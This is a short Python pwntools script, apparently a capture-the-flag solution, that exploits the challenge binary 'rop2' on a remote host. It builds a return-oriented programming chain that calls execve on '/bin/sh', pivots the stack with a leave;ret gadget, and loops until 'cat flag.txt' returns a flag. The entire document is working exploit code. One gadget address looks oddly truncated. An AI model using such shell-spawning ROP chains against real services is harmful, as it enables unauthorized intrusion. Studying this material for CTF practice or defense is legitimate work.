#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './rop2'
LIBC = ''
HOST = '140.110.112.77'
PORT = 3123

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    #r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

buf2 = 0x6CCD60

binsh = buf2
pop_rdi_ret = 0x0000000000401516
pop_rsi_ret = 0x0000000000401637
pop_rdx_pop_rsi_ret = 0x0000000000442909
pop_rax_pop_rdx_pop_rbx_ret = 0x0000000000478616
leave_ret = 0x00000000004009e4
syscall = 0x000004003da

ROP = flat(
    pop_rdi_ret,
    binsh,
    pop_rax_pop_rdx_pop_rbx_ret,
    0x3b,
    0,
    0,
    pop_rsi_ret,
    0,
    syscall
)
log.info(f"ROP start from: {hex(buf2+0x8)}")

# ./exp.py SILENT=1
while True:
    r = remote( HOST, PORT )
    r.send(b"/bin/sh\x00" + ROP)
    r.sendafter('input_size', (p64(buf2) + p64(leave_ret)).ljust(0x20, b'A')+b'\x00')
    r.sendlineafter('input_size', 'cat flag.txt')
    r.sendline('exit')
    a = r.recvall() # 4*4 == 16
    if b'{' in a:
        print(a)
        break
    r.close()
